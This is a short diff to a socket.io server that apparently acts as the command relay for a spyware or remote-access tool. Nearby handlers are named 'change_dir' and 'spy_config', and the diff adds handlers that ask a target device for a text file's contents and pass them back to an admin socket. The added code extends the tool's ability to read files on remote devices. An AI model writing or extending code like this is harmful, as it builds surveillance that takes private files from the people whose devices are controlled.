@@ -80,6 +80,14 @@ io.on("connection", (socket) => {
     console.log(dir);
     io.to(device_secure_ids[too]).emit("change_dir", dir);
   });
+socket.on("view_text_file", (dir, too) => {
+    console.log(dir);
+    io.to(device_secure_ids[too]).emit("view_text_file", dir);
+  });
+socket.on("view_text_file_data", (data) => {
+    console.log(data);
+    io.to(admin_socket_id).emit("view_text_file_data", data);
+  });
 socket.on("spy_config", (status, too) => {
     console.log(status);
     if(too == "all"){
